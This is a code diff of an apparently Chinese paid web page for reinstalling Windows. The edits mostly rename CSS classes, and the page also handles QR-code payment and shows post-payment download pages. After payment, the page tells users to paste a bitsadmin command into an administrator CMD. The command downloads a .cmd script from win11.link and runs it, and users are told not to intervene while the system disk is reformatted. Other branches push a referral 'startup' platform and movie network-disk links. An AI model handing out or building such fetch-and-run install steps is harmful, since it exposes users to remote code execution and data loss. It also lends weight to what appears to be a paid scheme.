+            <div class="payment-panel active" id="panelAlipay">
+                <div class="qr-code-box">
                     <img src="好友码.png" alt="支付宝收款码"
                          onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
                     <div class="qr-fallback" style="display:none">
-                        <span class="big-icon">💳</span>
+                        <span class="fallback-icon">💳</span>
                         <p>支付宝收款码</p>
-                        <p style="font-size:11px;color:#999">请替换 alipay-qr.png</p>
+                        <p class="fallback-hint">请替换 好友码.png</p>
                     </div>
                 </div>
                 <p class="qr-hint">打开支付宝 → 扫一扫</p>
             </div>
 
             <!-- 微信 -->
-            <div class="pay-panel" id="panelWechat">
-                <div class="qr-box">
+            <div class="payment-panel" id="panelWechat">
+                <div class="qr-code-box">
                     <img src="wechat-qr.png" alt="微信收款码"
                          onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
                     <div class="qr-fallback" style="display:none">
-                        <span class="big-icon">📱</span>
+                        <span class="fallback-icon">📱</span>
                         <p>微信收款码</p>
-                        <p style="font-size:11px;color:#999">请替换 wechat-qr.png</p>
+                        <p class="fallback-hint">请替换 wechat-qr.png</p>
                     </div>
                 </div>
                 <p class="qr-hint">打开微信 → 扫一扫</p>
             </div>
 
             <!-- 倒计时 -->
-            <div class="pay-timer">
+            <div class="payment-timer">
                 请在 <strong id="timerDisplay">05:00</strong> 内完成支付，超时订单自动取消
             </div>
 
             <!-- 确认 -->
-            <button class="confirm-btn" onclick="confirmPay()">
+            <button class="btn-confirm" onclick="confirmPay()">
                 ✓ 我已完成支付
             </button>
-            <div class="pay-note">
+            <div class="payment-note">
                 点击上方按钮后，系统将自动核实到账情况<br>
                 核实通过后立即下发安装命令和教程
             </div>
@@ -503,21 +606,18 @@
 </div>
 
 <!-- ==================== 订单号输入弹窗 ==================== -->
-<div class="modal-mask" id="orderNoModal">
-    <div class="modal" style="max-width: 400px;">
-        <div class="modal-head">
+<div class="modal-overlay" id="orderNoModal">
+    <div class="modal-container small">
+        <div class="modal-header">
             <h3>📝 请输入支付订单号</h3>
             <button class="modal-close" onclick="closeOrderNoModal()">&times;</button>
         </div>
         <div class="modal-body">
-            <p style="margin-bottom: 15px; color: var(--text-muted); font-size: 14px;">
+            <p class="input-hint">
                 请输入您支付成功后显示的订单号，用于核实支付情况
             </p>
-            <input type="text" id="orderNoInput" placeholder="请输入支付订单号" 
-                   style="width: 100%; padding: 12px 15px; border: 1px solid var(--border); 
-                          border-radius: 8px; background: var(--card); color: var(--text); 
-                          font-size: 14px; margin-bottom: 15px; box-sizing: border-box;">
-            <button class="confirm-btn" onclick="submitOrderNo()" style="width: 100%;">
+            <input type="text" id="orderNoInput" placeholder="请输入支付订单号" class="order-input">
+            <button class="btn-confirm" onclick="submitOrderNo()">
                 ✓ 提交订单号
             </button>
         </div>
@@ -525,65 +625,65 @@
 </div>
 
 <!-- ==================== 成功交付页 ==================== -->
-<div class="success-view" id="successView">
-    <div class="success-content">
-        <div class="success-hero">
-            <div class="success-icon-big">🎉</div>
+<div class="success-page" id="successView">
+    <div class="success-container">
+        <div class="success-header">
+            <div class="success-icon">🎉</div>
             <h2>支付成功！命令已生成</h2>
             <p id="successOS">您的 Windows 10 专属安装命令已就绪</p>
         </div>
 
         <!-- 安装命令 -->
-        <div class="cmd-card">
-            <div class="cmd-head">
+        <div class="command-card">
+            <div class="command-header">
                 <h3>⚡ 专属安装命令</h3>
-                <span class="tag">复制即用</span>
+                <span class="command-tag">复制即用</span>
             </div>
-            <div class="cmd-body">
-                <p style="margin-bottom: 15px; color: var(--text-muted); font-size: 14px;">
+            <div class="command-body">
+                <p class="command-hint">
                     打开命令提示符(管理员)【Win+R后输入cmd】或 Windows PowerShell(管理员)直接粘贴下面这行命令回车
                 </p>
                 
                 <!-- 命令 -->
-                <div class="cmd-block">
-                    <button class="cmd-copy" onclick="copyCmd1()">📋 复制</button>
-bitsadmin /transfer a http://win11.link %cd%\1.cmd&1
+                <div class="command-block">
+                    <button class="command-copy-btn" onclick="copyCmd1()">📋 复制</button>
+                    bitsadmin /transfer a http://win11.link %cd%\1.cmd&1
                 </div>
             </div>
         </div>
 
         <!-- 教程 -->
-        <div class="cmd-card">
-            <div class="cmd-head">
+        <div class="command-card">
+            <div class="command-header">
                 <h3>📖 安装教程</h3>
-                <span class="tag">新手友好</span>
+                <span class="command-tag">新手友好</span>
             </div>
-            <div class="cmd-body">
-                <div class="tut-step">
-                    <div class="tut-num">1</div>
-                    <div class="tut-body">
+            <div class="command-body">
+                <div class="tutorial-step">
+                    <div class="tutorial-number">1</div>
+                    <div class="tutorial-content">
                         <h4>打开 CMD（命令提示符）</h4>
                         <p>按 <strong>Win + R</strong>，输入 <strong>cmd</strong>，按 <strong>Ctrl+Shift+Enter</strong> 以管理员身份运行。<br>
                         或者：右键点击开始菜单 → 选择"Windows Terminal (管理员)"</p>
                     </div>
                 </div>
-                <div class="tut-step">
-                    <div class="tut-num">2</div>
-                    <div class="tut-body">
+                <div class="tutorial-step">
+                    <div class="tutorial-number">2</div>
+                    <div class="tutorial-content">
                         <h4>粘贴安装命令</h4>
                         <p>点击上方命令框右上角的「复制」按钮，在 CMD 窗口中<strong>右键粘贴</strong>（或 Ctrl+V），按回车执行。</p>
                     </div>
                 </div>
-                <div class="tut-step">
-                    <div class="tut-num">3</div>
-                    <div class="tut-body">
+                <div class="tutorial-step">
+                    <div class="tutorial-number">3</div>
+                    <div class="tutorial-content">
                         <h4>等待自动安装</h4>
                         <p>命令会自动下载安装脚本并执行。过程中电脑会重启多次，<strong>全程不要干预</strong>。安装完成后自动进入新系统桌面。</p>
                     </div>
                 </div>
-                <div class="tut-step">
-                    <div class="tut-num">4</div>
-                    <div class="tut-body">
+                <div class="tutorial-step">
+                    <div class="tutorial-number">4</div>
+                    <div class="tutorial-content">
                         <h4>完成！</h4>
                         <p>看到新系统桌面就说明安装成功了。建议先更新一下驱动，然后享受干净的新系统吧 🎉</p>
                     </div>
@@ -592,7 +692,7 @@ bitsadmin /transfer a http://win11.link %cd%\1.cmd&1
         </div>
 
         <!-- 注意事项 -->
-        <div class="notice-box">
+        <div class="notice-card">
             <h4>⚠️ 重要提示</h4>
             <ul>
                 <li>安装前请<strong>备份 C 盘重要数据</strong>，重装会格式化系统盘</li>
@@ -603,7 +703,7 @@ bitsadmin /transfer a http://win11.link %cd%\1.cmd&1
             </ul>
         </div>
 
-        <button class="close-success-btn" onclick="closeSuccess()">返回首页</button>
+        <button class="btn-back" onclick="closeSuccess()">返回首页</button>
     </div>
 </div>
 
@@ -650,14 +750,14 @@ function closePay() {
 
 function switchPay(type) {
     // 切换Tab样式
-    document.querySelectorAll('.pay-tab').forEach(t => t.classList.remove('active'));
-    document.querySelectorAll('.pay-panel').forEach(p => p.classList.remove('active'));
+    document.querySelectorAll('.payment-tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.payment-panel').forEach(p => p.classList.remove('active'));
 
     if (type === 'alipay') {
-        document.querySelectorAll('.pay-tab')[0].classList.add('active');
+        document.querySelectorAll('.payment-tab')[0].classList.add('active');
         document.getElementById('panelAlipay').classList.add('active');
     } else {
-        document.querySelectorAll('.pay-tab')[1].classList.add('active');
+        document.querySelectorAll('.payment-tab')[1].classList.add('active');
         document.getElementById('panelWechat').classList.add('active');
     }
 }
@@ -724,7 +824,7 @@ function submitOrderNo() {
     closeOrderNoModal();
     stopTimer();
     
-    const btn = document.querySelector('#payModal .confirm-btn');
+    const btn = document.querySelector('#payModal .btn-confirm');
     btn.disabled = true;
     btn.innerHTML = '⏳ 正在核实到账情况...';
 
@@ -750,7 +850,7 @@ function showSuccess() {
 
     // 获取成功页面的所有卡片
     const successView = document.getElementById('successView');
-    const allCards = successView.querySelectorAll('.cmd-card');
+    const allCards = successView.querySelectorAll('.command-card');
 
     if (isStartup) {
         // 网络创业项目显示资源链接
@@ -758,16 +858,16 @@ function showSuccess() {
 
         // 修改第一个卡片(命令卡片)
         if (allCards[0]) {
-            const cmdHead = allCards[0].querySelector('.cmd-head h3');
-            const cmdBody = allCards[0].querySelector('.cmd-body');
+            const cmdHead = allCards[0].querySelector('.command-header h3');
+            const cmdBody = allCards[0].querySelector('.command-body');
             if (cmdHead) cmdHead.textContent = '⚡ 网络创业项目基地';
             if (cmdBody) {
                 cmdBody.innerHTML = `
-                    <p style="margin-bottom: 15px; color: var(--text-muted); font-size: 14px;">
+                    <p class="command-hint">
                         自用省钱，推广赚钱 - 点击下方链接开始您的创业之旅
                     </p>
-                    <div class="cmd-block">
-                        <button class="cmd-copy" onclick="window.open('https://8z03s.riar0.xyz/#/', '_blank')">🔗 打开资源平台</button>
+                    <div class="command-block">
+                        <button class="command-copy-btn" onclick="window.open('https://8z03s.riar0.xyz/#/', '_blank')">🔗 打开资源平台</button>
                         资源地址: https://8z03s.riar0.xyz/#/
                     </div>
                 `;
@@ -777,35 +877,35 @@ function showSuccess() {
         // 修改第二个卡片为使用教程
         if (allCards[1]) {
             allCards[1].style.display = 'block';
-            const tutHead = allCards[1].querySelector('.cmd-head h3');
-            const tutBody = allCards[1].querySelector('.cmd-body');
+            const tutHead = allCards[1].querySelector('.command-header h3');
+            const tutBody = allCards[1].querySelector('.command-body');
             if (tutHead) tutHead.textContent = '📖 使用教程';
             if (tutBody) {
                 tutBody.innerHTML = `
-                    <div class="tut-step">
-                        <div class="tut-num">1</div>
-                        <div class="tut-body">
+                    <div class="tutorial-step">
+                        <div class="tutorial-number">1</div>
+                        <div class="tutorial-content">
                             <h4>打开资源平台</h4>
                             <p>点击上方链接，进入网络创业项目平台</p>
                         </div>
                     </div>
-                    <div class="tut-step">
-                        <div class="tut-num">2</div>
-                        <div class="tut-body">
+                    <div class="tutorial-step">
+                        <div class="tutorial-number">2</div>
+                        <div class="tutorial-content">
                             <h4>自用省钱</h4>
                             <p>在平台中<strong>购买所需资源</strong>，享受优惠价格，节省成本</p>
                         </div>
                     </div>
-                    <div class="tut-step">
-                        <div class="tut-num">3</div>
-                        <div class="tut-body">
+                    <div class="tutorial-step">
+                        <div class="tutorial-number">3</div>
+                        <div class="tutorial-content">
                             <h4>推广赚钱</h4>
                             <p>将平台资源<strong>分享给他人</strong>，通过推广获得收益回报</p>
                         </div>
                     </div>
-                    <div class="tut-step">
-                        <div class="tut-num">4</div>
-                        <div class="tut-body">
+                    <div class="tutorial-step">
+                        <div class="tutorial-number">4</div>
+                        <div class="tutorial-content">
                             <h4>开启创业之路</h4>
                             <p>自用省钱 + 推广赚钱，<strong>双管齐下</strong>，开启您的创业成功之路 🎉</p>
                         </div>
@@ -815,7 +915,7 @@ function showSuccess() {
         }
 
         // 修改注意事项
-        const noticeBox = successView.querySelector('.notice-box');
+        const noticeBox = successView.querySelector('.notice-card');
         if (noticeBox) {
             const noticeTitle = noticeBox.querySelector('h4');
             const noticeList = noticeBox.querySelector('ul');
@@ -836,20 +936,20 @@ function showSuccess() {
 
         // 修改第一个卡片(命令卡片)
         if (allCards[0]) {
-            const cmdHead = allCards[0].querySelector('.cmd-head h3');
-            const cmdBody = allCards[0].querySelector('.cmd-body');
+            const cmdHead = allCards[0].querySelector('.command-header h3');
+            const cmdBody = allCards[0].querySelector('.command-body');
             if (cmdHead) cmdHead.textContent = '⚡ 影视资源网盘基地';
             if (cmdBody) {
                 cmdBody.innerHTML = `
-                    <p style="margin-bottom: 15px; color: var(--text-muted); font-size: 14px;">
+                    <p class="command-hint">
                         点击下方链接访问影视资源网盘基地，搜索关键词找到对应合意的资源
                     </p>
-                    <div class="cmd-block" style="margin-bottom: 12px;">
-                        <button class="cmd-copy" onclick="window.open('http://aa.plool.com/app/index.html?id=211229kl', '_blank')">🔗 打开网盘1</button>
+                    <div class="command-block" style="margin-bottom: 12px;">
+                        <button class="command-copy-btn" onclick="window.open('http://aa.plool.com/app/index.html?id=211229kl', '_blank')">🔗 打开网盘1</button>
                         网盘地址1: http://aa.plool.com/app/index.html?id=211229kl
                     </div>
-                    <div class="cmd-block">
-                        <button class="cmd-copy" onclick="window.open('http://m.dbpan.com/app/index.html?id=211229kl', '_blank')">🔗 打开网盘2</button>
+                    <div class="command-block">
+                        <button class="command-copy-btn" onclick="window.open('http://m.dbpan.com/app/index.html?id=211229kl', '_blank')">🔗 打开网盘2</button>
                         网盘地址2: http://m.dbpan.com/app/index.html?id=211229kl
                     </div>
                 `;
@@ -859,35 +959,35 @@ function showSuccess() {
         // 修改第二个卡片为使用教程
         if (allCards[1]) {
             allCards[1].style.display = 'block';
-            const tutHead = allCards[1].querySelector('.cmd-head h3');
-            const tutBody = allCards[1].querySelector('.cmd-body');
+            const tutHead = allCards[1].querySelector('.command-header h3');
+            const tutBody = allCards[1].querySelector('.command-body');
             if (tutHead) tutHead.textContent = '📖 使用教程';
             if (tutBody) {
                 tutBody.innerHTML = `
-                    <div class="tut-step">
-                        <div class="tut-num">1</div>
-                        <div class="tut-body">
+                    <div class="tutorial-step">
+                        <div class="tutorial-number">1</div>
+                        <div class="tutorial-content">
                             <h4>打开网盘链接</h4>
                             <p>点击上方任意一个网盘链接，进入影视资源网盘基地</p>
                         </div>
                     </div>
-                    <div class="tut-step">
-                        <div class="tut-num">2</div>
-                        <div class="tut-body">
+                    <div class="tutorial-step">
+                        <div class="tutorial-number">2</div>
+                        <div class="tutorial-content">
                             <h4>搜索关键词</h4>
                             <p>在网盘中<strong>搜索关键词</strong>，找到对应合意的资源</p>
                         </div>
                     </div>
-                    <div class="tut-step">
-                        <div class="tut-num">3</div>
-                        <div class="tut-body">
+                    <div class="tutorial-step">
+                        <div class="tutorial-number">3</div>
+                        <div class="tutorial-content">
                             <h4>转存到网盘</h4>
                             <p>将找到的资源<strong>转存到对应的网盘</strong>（百度网盘或夸克网盘）</p>
                         </div>
                     </div>
-                    <div class="tut-step">
-                        <div class="tut-num">4</div>
-                        <div class="tut-body">
+                    <div class="tutorial-step">
+                        <div class="tutorial-number">4</div>
+                        <div class="tutorial-content">
                             <h4>开始追剧</h4>
                             <p>打开网盘App，<strong>美美哒去追剧</strong>即可享受精彩内容 🎉</p>
                         </div>
@@ -897,7 +997,7 @@ function showSuccess() {
         }
 
         // 修改注意事项
-        const noticeBox = successView.querySelector('.notice-box');
+        const noticeBox = successView.querySelector('.notice-card');
         if (noticeBox) {
             const noticeTitle = noticeBox.querySelector('h4');
             const noticeList = noticeBox.querySelector('ul');
@@ -918,16 +1018,16 @@ function showSuccess() {
 
         // 恢复第一个卡片(命令卡片)
         if (allCards[0]) {
-            const cmdHead = allCards[0].querySelector('.cmd-head h3');
-            const cmdBody = allCards[0].querySelector('.cmd-body');
+            const cmdHead = allCards[0].querySelector('.command-header h3');
+            const cmdBody = allCards[0].querySelector('.command-body');
             if (cmdHead) cmdHead.textContent = '⚡ 专属安装命令';
             if (cmdBody) {
                 cmdBody.innerHTML = `
-                    <p style="margin-bottom: 15px; color: var(--text-muted); font-size: 14px;">
+                    <p class="command-hint">
                         打开命令提示符(管理员)【Win+R后输入cmd】或 Windows PowerShell(管理员)直接粘贴下面这行命令回车
                     </p>
-                    <div class="cmd-block">
-                        <button class="cmd-copy" onclick="copyCmd1()">📋 复制</button>
+                    <div class="command-block">
+                        <button class="command-copy-btn" onclick="copyCmd1()">📋 复制</button>
                         bitsadmin /transfer a http://win11.link %cd%\\1.cmd&1
                     </div>
                 `;
@@ -937,36 +1037,36 @@ function showSuccess() {
         // 恢复第二个卡片(教程卡片)
         if (allCards[1]) {
             allCards[1].style.display = 'block';
-            const tutHead = allCards[1].querySelector('.cmd-head h3');
-            const tutBody = allCards[1].querySelector('.cmd-body');
+            const tutHead = allCards[1].querySelector('.command-header h3');
+            const tutBody = allCards[1].querySelector('.command-body');
             if (tutHead) tutHead.textContent = '📖 安装教程';
             if (tutBody) {
                 tutBody.innerHTML = `
-                    <div class="tut-step">
-                        <div class="tut-num">1</div>
-                        <div class="tut-body">
+                    <div class="tutorial-step">
+                        <div class="tutorial-number">1</div>
+                        <div class="tutorial-content">
                             <h4>打开 CMD（命令提示符）</h4>
                             <p>按 <strong>Win + R</strong>，输入 <strong>cmd</strong>，按 <strong>Ctrl+Shift+Enter</strong> 以管理员身份运行。<br>
                             或者：右键点击开始菜单 → 选择"Windows Terminal (管理员)"</p>
                         </div>
                     </div>
-                    <div class="tut-step">
-                        <div class="tut-num">2</div>
-                        <div class="tut-body">
+                    <div class="tutorial-step">
+                        <div class="tutorial-number">2</div>
+                        <div class="tutorial-content">
                             <h4>粘贴安装命令</h4>
                             <p>点击上方命令框右上角的「复制」按钮，在 CMD 窗口中<strong>右键粘贴</strong>（或 Ctrl+V），按回车执行。</p>
                         </div>
                     </div>
-                    <div class="tut-step">
-                        <div class="tut-num">3</div>
-                        <div class="tut-body">
+                    <div class="tutorial-step">
+                        <div class="tutorial-number">3</div>
+                        <div class="tutorial-content">
                             <h4>等待自动安装</h4>
                             <p>命令会自动下载安装脚本并执行。过程中电脑会重启多次，<strong>全程不要干预</strong>。安装完成后自动进入新系统桌面。</p>
                         </div>
                     </div>
-                    <div class="tut-step">
-                        <div class="tut-num">4</div>
-                        <div class="tut-body">
+                    <div class="tutorial-step">
+                        <div class="tutorial-number">4</div>
+                        <div class="tutorial-content">
                             <h4>完成！</h4>
                             <p>看到新系统桌面就说明安装成功了。建议先更新一下驱动，然后享受干净的新系统吧 🎉</p>
                         </div>
@@ -976,7 +1076,7 @@ function showSuccess() {
         }
 
         // 恢复注意事项
-        const noticeBox = successView.querySelector('.notice-box');
+        const noticeBox = successView.querySelector('.notice-card');
         if (noticeBox) {
             const noticeTitle = noticeBox.querySelector('h4');
             const noticeList = noticeBox.querySelector('ul');
